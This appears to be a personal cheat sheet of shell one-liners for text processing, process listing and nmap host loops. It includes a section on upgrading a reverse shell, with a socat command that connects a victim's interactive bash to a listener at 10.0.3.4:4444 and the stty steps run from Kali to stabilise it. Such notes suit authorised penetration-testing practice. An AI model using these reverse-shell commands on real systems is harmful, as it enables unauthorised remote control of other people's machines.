Word count
```bash
wc -l

#example count open host(line count)
cat nmap.txt | grep open | wc -l
```
Grep with line before 
`cat txt | grep -B 2 open`
find in window
`findstr ...`
Bash loop
`for ip in $(cat host.txt); do echo $ip;nmap -sV $ip; done`
Copy file to current dir
`cp /path/to/file/file.txt  .`

ps aux but full command-- w for wide , ww extrawide
```
ps auxww
```
# upgrading shell
```bash
#python pty module
s

#socat
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444
#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

#stty options
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
# In Kali
$ stty raw -echo
$ fg
# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

inspect the current TGT available
`klist` 

trim spacebar
```
tr -s ' '
```
then cut
```
cut -d ' ' -f5
```

actually awk is better
```
awk '{print $5}' filename.txt
```
awk treat all white spaces no need to trim

# file size
show size of subfolder
```
du -sh ./* | sort -h
```